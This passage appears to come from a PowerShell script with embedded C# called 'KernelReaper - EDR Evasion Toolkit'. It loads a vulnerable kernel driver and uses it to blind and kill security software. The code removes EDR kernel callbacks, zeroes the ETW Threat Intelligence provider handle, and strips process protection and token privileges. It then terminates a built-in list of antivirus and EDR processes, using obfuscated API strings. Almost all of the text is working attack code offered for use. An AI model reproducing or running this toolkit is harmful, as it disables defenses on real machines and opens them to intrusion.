            if (pe[innerOff + i] == 0x4C && pe[innerOff + i + 1] == 0x8D)
            {
                byte modrm = pe[innerOff + i + 2];
                if ((modrm & 0xC7) == 0x05) match = true;
            }
            if (pe[innerOff + i] == 0x48 && pe[innerOff + i + 1] == 0x8D)
            {
                byte modrm = pe[innerOff + i + 2];
                if (modrm == 0x15) match = true; // LEA RDX
            }
            if (match)
            {
                uint arrayRVA = ResolveRipRelativeRVA(pe, innerOff + i, 7, sectOff, numSect);
                if (arrayRVA > 0 && arrayRVA < 0x10000000)
                {
                    DbgLog("    -> LEA alt found, array RVA 0x{0:X}", arrayRVA);
                    return arrayRVA;
                }
            }
        }
        return 0;
    }

    // Known Windows system drivers — NEVER remove their callbacks
    static string[] _sysDrivers = new string[] {
        "ntoskrnl", "ntkrnl", "ci.dll", "cng.sys", "ksecdd.sys", "ksecpkg.sys",
        "tcpip.sys", "fwpkclnt.sys", "netio.sys", "ndis.sys", "afd.sys",
        "wdfilter.sys", "wdnisdrv.sys",
        "dxgkrnl.sys", "win32k", "peauth.sys",
        "clfs.sys", "volmgr.sys", "fltmgr.sys", "ntfs.sys", "refs.sys",
        "iorate.sys", "ahcache.sys", "mmcss.sys", "luafv.sys",
        "appid.sys", "ksld.sys", "storport.sys", "spaceport.sys",
        "srv2.sys", "srvnet.sys", "mrxsmb", "rdbss.sys",
        "http.sys", "mpsdrv.sys", "bam.sys", "dam.sys",
        "verifier.dll", "apisetschema.dll"
    };

    public static int DoRemoveCallbacks(IntPtr hDev, ulong ntBase, string[] edrTargets, bool dryRun = false)
    {
        string[] exports = new string[] {
            "PsSetCreateProcessNotifyRoutine",
            "PsSetLoadImageNotifyRoutine",
            "PsSetCreateThreadNotifyRoutine"
        };
        string[] labels = new string[] { "Process", "ImageLoad", "Thread" };

        DbgLog("[CB] ntBase = 0x{0:X}, dryRun = {1}", ntBase, dryRun);
        DriverRange[] drvRanges = GetDriverRanges();
        DbgLog("[CB] Got {0} driver ranges", drvRanges.Length);
        int totalRemoved = 0;

        for (int e = 0; e < exports.Length; e++)
        {
            DbgLog("[CB] Scanning {0}...", exports[e]);
            uint arrayRVA = FindCallbackArrayRVA(exports[e]);
            if (arrayRVA == 0)
            {
                DbgLog("[CB] {0} callback array NOT FOUND", labels[e]);
                continue;
            }
            ulong arrayAddr = ntBase + arrayRVA;
            DbgLog("[CB] {0} arrayRVA=0x{1:X} arrayAddr=0x{2:X}", labels[e], arrayRVA, arrayAddr);

            int validSlots = 0;
            int emptySlots = 0;
            DbgLog("[CB] Starting validation read of {0} slots...", MAX_CALLBACK_SLOTS);
            for (int s = 0; s < MAX_CALLBACK_SLOTS; s++)
            {
                byte[] b = new byte[8];
                DbgLog("[CB]   pre-read slot {0} @ 0x{1:X}", s, arrayAddr + (ulong)(s * 8));
                if (!ReadKernelVM(hDev, arrayAddr + (ulong)(s * 8), b, 8)) { DbgLog("[CB]   read FAILED at slot {0}", s); break; }
                ulong raw = BitConverter.ToUInt64(b, 0);
                if (raw == 0) { emptySlots++; continue; }
                ulong block = raw & ~0xFUL;
                DbgLog("[CB]   slot {0}: raw=0x{1:X} block=0x{2:X}", s, raw, block);
                if (block < 0xFFFF000000000000UL) { DbgLog("[CB]   NON-KERNEL ptr - ABORT"); arrayAddr = 0; break; }
                validSlots++;
            }

            if (arrayAddr == 0 || (validSlots == 0 && emptySlots < 32))
            {
                DbgLog("[CB] Validation FAILED (valid={0}, empty={1})", validSlots, emptySlots);
                continue;
            }
            DbgLog("[CB] Validation OK: {0} callbacks, {1} empty", validSlots, emptySlots);

            for (int s = 0; s < MAX_CALLBACK_SLOTS; s++)
            {
                try
                {
                    byte[] slotBuf = new byte[8];
                    if (!ReadKernelVM(hDev, arrayAddr + (ulong)(s * 8), slotBuf, 8)) continue;
                    ulong raw = BitConverter.ToUInt64(slotBuf, 0);
                    ulong block = raw & ~0xFUL;
                    if (block == 0 || block < 0xFFFF000000000000UL) continue;

                    byte[] funcBuf = new byte[8];
                    if (!ReadKernelVM(hDev, block + 0x08, funcBuf, 8)) { DbgLog("[CB]   slot {0}: block 0x{1:X} unreadable, skip", s, block); continue; }
                    ulong funcPtr = BitConverter.ToUInt64(funcBuf, 0);
                    if (funcPtr == 0 || funcPtr < 0xFFFF000000000000UL) continue;

                    string owner = FindDriverForAddr(drvRanges, funcPtr);
                    DbgLog("[CB]   [{0}] slot {1}: func=0x{2:X} ({3})", labels[e], s, funcPtr, owner);

                    string ownerLow = owner.ToLowerInvariant();
                    bool isSys = false;
                    foreach (string sd in _sysDrivers) { if (ownerLow.Contains(sd.ToLowerInvariant())) { isSys = true; break; } }
                    if (isSys) { DbgLog("[CB]     SKIP (system driver)"); continue; }
                    if (edrTargets != null && edrTargets.Length > 0)
                    {
                        bool isEdr = false;
                        foreach (string t in edrTargets)
                        {
                            string tn = t.Trim().Replace(".exe","").ToLowerInvariant();
                            if (tn.Length > 0 && ownerLow.Contains(tn)) { isEdr = true; break; }
                        }
                        if (!isEdr) { DbgLog("[CB]     SKIP (not in EDR list)"); continue; }
                    }
                    ulong slotAddr = arrayAddr + (ulong)(s * 8);
                    if (dryRun)
                    {
                        DbgLog("[CB]   WOULD REMOVE {0} slot {1} ({2}) @ 0x{3:X}", labels[e], s, owner, slotAddr);
                        totalRemoved++;
                        continue;
                    }
                    DbgLog("[CB]   REMOVING {0} slot {1} ({2}) @ 0x{3:X}", labels[e], s, owner, slotAddr);

                    WriteKernelQword(hDev, slotAddr, 0);

                    DbgLog("[CB]   REMOVED OK slot {0}", s);
                    totalRemoved++;
                }
                catch (Exception ex) { DbgLog("[CB]   slot {0} EXCEPTION: {1}", s, ex.Message); }
            }
        }

        DbgLog("[CB] Total removed: {0}", totalRemoved);
        return totalRemoved;
    }

    #endregion

    #region Token downgrade

    public static int DoTokenDowngrade(IntPtr hDev, EprocOff off, ulong ntBase, string[] targets)
    {
        ulong psiVA = FindExportVA(ntBase, new string(new char[]{'P','s','I','n','i','t','i','a','l','S','y','s','t','e','m','P','r','o','c','e','s','s'}));
        ulong sysEp = ReadKernelUlong64(hDev, psiVA);
        ulong head = sysEp + (ulong)off.Links;
        ulong cur = ReadKernelUlong64(hDev, head);
        int count = 0, maxIter = 4096;
        HashSet<string> targetSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (string t in targets) targetSet.Add(t.Trim());

        while (cur != head && cur != 0 && maxIter-- > 0)
        {
            ulong ep = cur - (ulong)off.Links;
            byte[] nb = new byte[15];
            ReadKernelBytes(hDev, ep + (ulong)off.Name, nb, 15);
            string nm = Encoding.ASCII.GetString(nb).TrimEnd('\0');

            if (targetSet.Contains(nm))
            {
                ulong pid = ReadKernelUlong64(hDev, ep + (ulong)off.Pid);
                DbgLog("[TK] {0} (PID {1}) EPROCESS 0x{2:X}", nm, pid, ep);

                ulong tokenRef = ReadKernelUlong64(hDev, ep + (ulong)off.Token);
                ulong tokenAddr = tokenRef & ~0xFUL;
                DbgLog("[TK]   TOKEN: 0x{0:X}", tokenAddr);

                byte[] privBuf = new byte[8];
                ReadKernelBytes(hDev, tokenAddr + TOKEN_PRIV_ENABLED, privBuf, 8);
                ulong curPriv = BitConverter.ToUInt64(privBuf, 0);
                DbgLog("[TK]   Priv.Enabled: 0x{0:X16}", curPriv);

                WriteKernelVM(hDev, tokenAddr + TOKEN_PRIV_ENABLED, new byte[8], 8);
                ReadKernelBytes(hDev, tokenAddr + TOKEN_PRIV_ENABLED, privBuf, 8);
                ulong newPriv = BitConverter.ToUInt64(privBuf, 0);
                DbgLog("[+] {0}: Privileges 0x{1:X16} -> 0x{2:X16}", nm, curPriv, newPriv);

                count++;
            }
            cur = ReadKernelUlong64(hDev, cur);
        }
        DbgLog("[TK] Downgraded {0} token(s)", count);
        return count;
    }

    #endregion

    #region ETW Blind

    static bool CheckTiGuid(IntPtr hDev, ulong regEntry, byte[] tiGuid)
    {
        int[] directOffsets = { 0x20, 0x10, 0x28, 0x30, 0x08, 0x40 };
        foreach (int gOff in directOffsets)
        {
            byte[] probe = new byte[16];
            if (!ReadKernelVM(hDev, regEntry + (ulong)gOff, probe, 16)) continue;
            bool match = true;
            for (int g = 0; g < 16; g++) { if (probe[g] != tiGuid[g]) { match = false; break; } }
            if (match) { DbgLog("[ETW] TI GUID at regEntry+0x{0:X} (direct)", gOff); return true; }
        }
        return false;
    }

    public static bool DoETWBlind(IntPtr hDev, ulong ntBase)
    {
        byte[] tiGuid = new byte[] { 0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
                                      0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44 };
        byte[] pe = GetNtPE();
        int peOff = BitConverter.ToInt32(pe, 0x3C);
        int numSect = BitConverter.ToUInt16(pe, peOff + 6);
        int szOpt = BitConverter.ToUInt16(pe, peOff + 20);
        int sectOff = peOff + 24 + szOpt;

        // Scan multiple exported functions for LEA references to the handle
        string[] scanFuncs = {
            new string(new char[]{'K','e','I','n','s','e','r','t','Q','u','e','u','e','A','p','c'}),
            new string(new char[]{'N','t','T','r','a','c','e','C','o','n','t','r','o','l'}),
            new string(new char[]{'E','t','w','S','e','n','d','T','r','a','c','e','B','u','f','f','e','r'}),
            new string(new char[]{'E','t','w','W','r','i','t','e'}),
            new string(new char[]{'P','s','C','a','l','l','I','m','a','g','e','N','o','t','i','f','y','R','o','u','t','i','n','e','s'})
        };

        HashSet<uint> allCandidates = new HashSet<uint>();
        foreach (string funcName in scanFuncs)
        {
            uint funcRva = FindExportRVA(pe, funcName);
            if (funcRva == 0) continue;
            int funcOff = RvaToOff(pe, funcRva, sectOff, numSect);
            if (funcOff <= 0) continue;
            int scanLen = Math.Min(1024, pe.Length - funcOff);
            DbgLog("[ETW] Scanning {0} (RVA 0x{1:X}, {2} bytes)", funcName, funcRva, scanLen);

            for (int i = 0; i < scanLen - 7; i++)
            {
                if ((pe[funcOff + i] == 0x48 || pe[funcOff + i] == 0x4C) && pe[funcOff + i + 1] == 0x8D)
                {
                    byte modrm = pe[funcOff + i + 2];
                    if ((modrm & 0xC7) != 0x05) continue;
                    uint targetRVA = ResolveRipRelativeRVA(pe, funcOff + i, 7, sectOff, numSect);
                    if (targetRVA > 0 && targetRVA < 0x10000000)
                        allCandidates.Add(targetRVA);
                }
            }
        }
        DbgLog("[ETW] Total unique candidates: {0}", allCandidates.Count);

        foreach (uint candRVA in allCandidates)
        {
            ulong handleAddr = ntBase + candRVA;
            try
            {
                ulong regEntry = ReadKernelUlong64(hDev, handleAddr);
                if (regEntry == 0 || regEntry < 0xFFFF000000000000UL) continue;
                DbgLog("[ETW] RVA 0x{0:X} -> 0x{1:X} -> 0x{2:X}", candRVA, handleAddr, regEntry);

                if (CheckTiGuid(hDev, regEntry, tiGuid))
                {
                    WriteKernelVM(hDev, handleAddr, new byte[8], 8);
                    ulong verify = ReadKernelUlong64(hDev, handleAddr);
                    if (verify == 0)
                    {
                        DbgLog("[+] EtwThreatIntProvRegHandle zeroed @ 0x{0:X}", handleAddr);
                        return true;
                    }
                }
            }
            catch (Exception ex) { DbgLog("[ETW] 0x{0:X}: {1}", candRVA, ex.Message); }
        }

        DbgLog("[-] ETW ThreatInt provider not found via targeted scan");
        return false;
    }

    #endregion

    #region EDR Kill

    public static int RemoveWdFilterObCallbacks(IntPtr hDev, ulong ntBase)
    {
        DriverRange[] drvRanges = GetDriverRanges();
        int removed = 0;
        string wdName = new string(new char[]{'w','d','f','i','l','t','e','r'});
        string[] typeExports = {
            new string(new char[]{'P','s','P','r','o','c','e','s','s','T','y','p','e'}),
            new string(new char[]{'P','s','T','h','r','e','a','d','T','y','p','e'})
        };
        string[] typeLabels = { "Process", "Thread" };

        for (int t = 0; t < typeExports.Length; t++)
        {
            try
            {
                ulong ptVA = FindExportVA(ntBase, typeExports[t]);
                ulong objType = ReadKernelUlong64(hDev, ptVA);
                if (objType == 0 || objType < 0xFFFF000000000000UL)
                {
                    DbgLog("[OB] {0} -> invalid OBJECT_TYPE", typeLabels[t]);
                    continue;
                }
                DbgLog("[OB] {0}: OBJECT_TYPE @ 0x{1:X}", typeLabels[t], objType);

                ulong listHead = objType + 0xC8;
                ulong flink = ReadKernelUlong64(hDev, listHead);
                if (flink == listHead || flink == 0)
                {
                    DbgLog("[OB] {0}: CallbackList empty", typeLabels[t]);
                    continue;
                }

                int maxIter = 256;
                while (flink != listHead && flink != 0 && flink > 0xFFFF000000000000UL && maxIter-- > 0)
                {
                    ulong nextFlink = ReadKernelUlong64(hDev, flink);
                    ulong preOp = ReadKernelUlong64(hDev, flink + 0x28);
                    ulong postOp = ReadKernelUlong64(hDev, flink + 0x30);

                    string preOwner = (preOp != 0 && preOp > 0xFFFF000000000000UL) ? FindDriverForAddr(drvRanges, preOp) : "";
                    string postOwner = (postOp != 0 && postOp > 0xFFFF000000000000UL) ? FindDriverForAddr(drvRanges, postOp) : "";

                    DbgLog("[OB] {0} entry 0x{1:X}: PreOp=0x{2:X}({3}) PostOp=0x{4:X}({5})",
                        typeLabels[t], flink, preOp, preOwner, postOp, postOwner);

                    bool isWdf = preOwner.ToLowerInvariant().Contains(wdName) ||
                                 postOwner.ToLowerInvariant().Contains(wdName);

                    if (isWdf)
                    {
                        WriteKernelQword(hDev, flink + 0x10, 0);
                        DbgLog("[+] WdFilter {0} OB callback neutralized (Operations zeroed) at 0x{1:X}", typeLabels[t], flink);
                        removed++;
                    }

                    flink = nextFlink;
                }
            }
            catch (Exception ex) { DbgLog("[OB] {0}: {1}", typeLabels[t], ex.Message); }
        }

        DbgLog("[OB] Neutralized {0} WdFilter OB callback(s)", removed);
        return removed;
    }

    public static void StripProtection(IntPtr hDev, EprocOff off, ulong ep, string name, ulong pid)
    {
        if (off.Protection < 0) { DbgLog("[KILL]   PPL not available on this build"); return; }
        ulong sva = ep + (ulong)off.SigLevel;
        byte[] pb = new byte[3]; ReadKernelBytes(hDev, sva, pb, 3);
        DbgLog("[KILL]   Prot: SigLevel=0x{0:X2} SectSig=0x{1:X2} Protection=0x{2:X2}", pb[0], pb[1], pb[2]);
        if (pb[2] != 0)
        {
            WriteKernelVM(hDev, sva, new byte[]{0,0,0}, 3);
            ReadKernelBytes(hDev, sva, pb, 3);
            DbgLog("[+]   {0}: PPL stripped (Prot=0x{1:X2})", name, pb[2]);
        }
    }

    public static void StripToken(IntPtr hDev, EprocOff off, ulong ep, string name)
    {
        ulong tokenRef = ReadKernelUlong64(hDev, ep + (ulong)off.Token);
        ulong tokenAddr = tokenRef & ~0xFUL;
        byte[] privBuf = new byte[8];
        ReadKernelBytes(hDev, tokenAddr + TOKEN_PRIV_ENABLED, privBuf, 8);
        ulong curPriv = BitConverter.ToUInt64(privBuf, 0);
        if (curPriv != 0)
        {
            WriteKernelVM(hDev, tokenAddr + TOKEN_PRIV_ENABLED, new byte[8], 8);
            DbgLog("[+]   {0}: Token Enabled 0x{1:X16} -> 0", name, curPriv);
        }
    }

    public static ulong FindEprocessByPid(IntPtr hDev, EprocOff off, ulong ntBase, int targetPid)
    {
        ulong psiVA = FindExportVA(ntBase, new string(new char[]{'P','s','I','n','i','t','i','a','l','S','y','s','t','e','m','P','r','o','c','e','s','s'}));
        ulong sysEp = ReadKernelUlong64(hDev, psiVA);
        ulong head = sysEp + (ulong)off.Links;
        ulong cur = ReadKernelUlong64(hDev, head);
        int maxIter = 4096;
        while (cur != head && cur != 0 && maxIter-- > 0)
        {
            ulong ep = cur - (ulong)off.Links;
            ulong pid = ReadKernelUlong64(hDev, ep + (ulong)off.Pid);
            if ((int)pid == targetPid) return ep;
            cur = ReadKernelUlong64(hDev, cur);
        }
        return 0;
    }

    public static int DoEDRKill(IntPtr hDev, EprocOff off, ulong ntBase, int[] targetPids)
    {
        if (!EnableDebugPrivilege()) DbgLog("[!] Failed to enable debug privilege");
        else DbgLog("[KILL] SeDebugPrivilege enabled");
        DbgLog("[KILL] Neutralizing WdFilter OB callbacks...");
        RemoveWdFilterObCallbacks(hDev, ntBase);
        int killed = 0;
        foreach (int pid in targetPids)
        {
            ulong ep = FindEprocessByPid(hDev, off, ntBase, pid);
            if (ep == 0) { DbgLog("[-] PID {0} not found in EPROCESS list", pid); continue; }
            byte[] nb = new byte[15];
            ReadKernelBytes(hDev, ep + (ulong)off.Name, nb, 15);
            string nm = Encoding.ASCII.GetString(nb).TrimEnd('\0');
            DbgLog("[KILL] {0} (PID {1}) EPROCESS 0x{2:X}", nm, pid, ep);
            StripProtection(hDev, off, ep, nm, (ulong)pid);
            StripToken(hDev, off, ep, nm);

            IntPtr hProc = OpenProcess(0x001FFFFF, false, pid);
            if (hProc == IntPtr.Zero)
            {
                hProc = OpenProcess(0x0001, false, pid);
                if (hProc == IntPtr.Zero) { DbgLog("[-] OpenProcess PID {0} failed (err {1})", pid, Marshal.GetLastWin32Error()); continue; }
            }
            DbgLog("[KILL] Handle obtained for PID {0}", pid);
            if (TerminateProcess(hProc, 1)) { DbgLog("[+] {0} (PID {1}) terminated", nm, pid); killed++; }
            else
            {
                int err1 = Marshal.GetLastWin32Error();
                DbgLog("[!] TerminateProcess failed (err {0}), trying NtTerminateProcess...", err1);
                int status = NtTerminateProcess(hProc, 1);
                if (status == 0) { DbgLog("[+] {0} (PID {1}) terminated via Nt", nm, pid); killed++; }
                else DbgLog("[-] NtTerminateProcess PID {0} failed (NTSTATUS 0x{1:X8})", pid, status);
            }
            CloseHandle(hProc);
        }
        DbgLog("[KILL] Killed {0}/{1}", killed, targetPids.Length);
        return killed;
    }

    public static int DoEDRKillByName(IntPtr hDev, EprocOff off, ulong ntBase, string[] targets)
    {
        HashSet<string> targetSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (string t in targets)
        {
            string n = t.Trim().Replace(".exe","");
            if (n.Length > 0) targetSet.Add(n);
        }
        ulong psiVA = FindExportVA(ntBase, new string(new char[]{'P','s','I','n','i','t','i','a','l','S','y','s','t','e','m','P','r','o','c','e','s','s'}));
        ulong sysEp = ReadKernelUlong64(hDev, psiVA);
        ulong head = sysEp + (ulong)off.Links;
        ulong cur = ReadKernelUlong64(hDev, head);
        int maxIter = 4096;
        List<int> pids = new List<int>();
        while (cur != head && cur != 0 && maxIter-- > 0)
        {
            ulong ep = cur - (ulong)off.Links;
            byte[] nb = new byte[15];
            ReadKernelBytes(hDev, ep + (ulong)off.Name, nb, 15);
            string nm = Encoding.ASCII.GetString(nb).TrimEnd('\0').Replace(".exe","");
            if (targetSet.Contains(nm))
            {
                ulong pid = ReadKernelUlong64(hDev, ep + (ulong)off.Pid);
                pids.Add((int)pid);
            }
            cur = ReadKernelUlong64(hDev, cur);
        }
        if (pids.Count == 0) { DbgLog("[KILL] No matching processes found"); return 0; }
        return DoEDRKill(hDev, off, ntBase, pids.ToArray());
    }

    #endregion
}
'@

# --- Main ---

if ($All) { $RemovePPL = $true; $Callbacks = $true; $TokenDowngrade = $true; $ETWBlind = $true; $EDRKill = $true }
if (-not ($RemovePPL -or $Callbacks -or $CallbacksDryRun -or $TokenDowngrade -or $ETWBlind -or $EDRKill)) {
    Show-Help
}

Write-Host "`n=== KernelReaper - EDR Evasion Toolkit (RootLaser / KDU Provider 65) ===" -ForegroundColor Cyan
Write-Host ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "[-] Admin required." -ForegroundColor Red; exit 1 }

# Default EDR process list
$defaultEDR = @(
    "MsMpEng.exe","MsSense.exe","SenseIR.exe","SenseCncProxy.exe",
    "CrowdStrike.exe","CSFalconService.exe","CSFalconContainer.exe",
    "cb.exe","CbDefense.exe","CbOsR.exe","RepMgr.exe",
    "SentinelOne.exe","SentinelAgent.exe","SentinelServiceHost.exe",
    "CylanceSvc.exe","CylanceUI.exe",
    "xagt.exe","xagtnotif.exe",
    "TaniumClient.exe","TaniumCX.exe",
    "Traps.exe","CyvrFsFlt.exe","cyserver.exe",
    "WRSA.exe","WRCoreService.exe",
    "bdservicehost.exe","bdagent.exe","bdntwrk.exe",
    "savservice.exe","SophosAgent.exe","SophosCleanM.exe",
    "klif.exe","kavfs.exe","avp.exe",
    "fshoster32.exe","FSSOMA.exe",
    "ERAAgent.exe","ekrn.exe","egui.exe",
    "fortitray.exe","FortiESNAC.exe","FCDBLog.exe"
)

$edrList = if ($TargetEDR) { $TargetEDR.Split(",") } else { $defaultEDR }

$precompiledDll = Join-Path (Split-Path $Drv64Path) "PPLRemover.dll"
if (Test-Path $precompiledDll) {
    Write-Host "[*] Loading precompiled DLL..." -ForegroundColor Yellow
    Add-Type -Path $precompiledDll
} else {
    Write-Host "[*] Compiling..." -ForegroundColor Yellow
    Add-Type -TypeDefinition $CSharpCode -Language CSharp -ReferencedAssemblies @('System.dll')
}

$tempSys = ""
$hDev = [IntPtr]::Zero

try {
    # Extract and load driver
    if ($DriverPath -and (Test-Path $DriverPath)) {
        $tempSys = (Resolve-Path $DriverPath).Path
    } else {
        $Drv64Path = (Resolve-Path $Drv64Path -ErrorAction Stop).Path
        Write-Host "[*] Extracting from: $Drv64Path"
        $drvBytes = [PPLRemover]::ExtractDriverFromDB($Drv64Path)
        $tempSys = Join-Path $env:TEMP "RootLaser.sys"
        [System.IO.File]::WriteAllBytes($tempSys, $drvBytes)
    }

    Write-Host "[*] Loading driver..." -ForegroundColor Yellow
    [PPLRemover]::InstallDriver($tempSys, $ServiceName)
    $hDev = [PPLRemover]::OpenDevice()
    Write-Host "[+] Device ready" -ForegroundColor Green

    if ($DebugLog) {
        [PPLRemover]::DebugLogFile = $DebugLog
        [PPLRemover]::DbgLog("=== Debug session started $(Get-Date) ===")
    }

    $off = [PPLRemover]::GetOffsets()
    $ntBase = [PPLRemover]::GetNtBase()

    # 1. Remove PPL
    if ($RemovePPL) {
        Write-Host "`n--- Remove PPL ---" -ForegroundColor Cyan
        if ($TargetPID.Count -gt 0) {
            foreach ($p in $TargetPID) {
                $ep = [PPLRemover]::FindEprocessByPid($hDev, $off, $ntBase, $p)
                if ($ep -eq 0) { Write-Host "[-] PID $p not found" -ForegroundColor Red; continue }
                $nb = New-Object byte[] 15
                [PPLRemover]::ReadKernelBytes($hDev, $ep + [uint64]$off.Name, $nb, 15) | Out-Null
                $nm = [System.Text.Encoding]::ASCII.GetString($nb).TrimEnd([char]0)
                Write-Host "[*] Stripping PPL from $nm (PID $p)" -ForegroundColor Yellow
                [PPLRemover]::StripProtection($hDev, $off, $ep, $nm, [uint64]$p)
            }
        } else {
            [PPLRemover]::DoRemovePPL($hDev, $off, $ntBase) | Out-Null
        }
    }

    # 2. Remove callbacks
    if ($Callbacks -or $CallbacksDryRun) {
        Write-Host "`n--- Kernel Callbacks ---" -ForegroundColor Cyan
        $cbDry = $CallbacksDryRun.IsPresent
        if ($cbDry) { Write-Host "[*] DRY RUN mode - read only, no writes" -ForegroundColor Yellow }
        [PPLRemover]::DoRemoveCallbacks($hDev, $ntBase, [string[]]$edrList, $cbDry) | Out-Null
    }

    # 3. ETW Blind
    if ($ETWBlind) {
        Write-Host "`n--- ETW Blind ---" -ForegroundColor Cyan
        [PPLRemover]::DoETWBlind($hDev, $ntBase) | Out-Null
    }

    # 4. Token downgrade
    if ($TokenDowngrade) {
        Write-Host "`n--- Token Downgrade ---" -ForegroundColor Cyan
        [PPLRemover]::DoTokenDowngrade($hDev, $off, $ntBase, $edrList) | Out-Null
    }

    # 5. EDR Kill (strip PPL + token + kill)
    if ($EDRKill) {
        Write-Host "`n--- EDR Kill ---" -ForegroundColor Cyan
        if ($TargetPID.Count -gt 0) {
            [PPLRemover]::DoEDRKill($hDev, $off, $ntBase, [int[]]$TargetPID) | Out-Null
        } else {
            [PPLRemover]::DoEDRKillByName($hDev, $off, $ntBase, [string[]]$edrList) | Out-Null
        }
    }

    Write-Host "`n[+] Done." -ForegroundColor Green
}
catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($hDev -ne [IntPtr]::Zero) { [PPLRemover]::CloseHandle($hDev) | Out-Null }
    Write-Host "[*] Cleanup..." -ForegroundColor Yellow
    [PPLRemover]::UnloadDriver($ServiceName)
    if ($tempSys -and $tempSys -like "*\Temp\*" -and (Test-Path $tempSys)) {
        Remove-Item $tempSys -Force -ErrorAction SilentlyContinue
    }
    Write-Host "[+] Done." -ForegroundColor Green
}
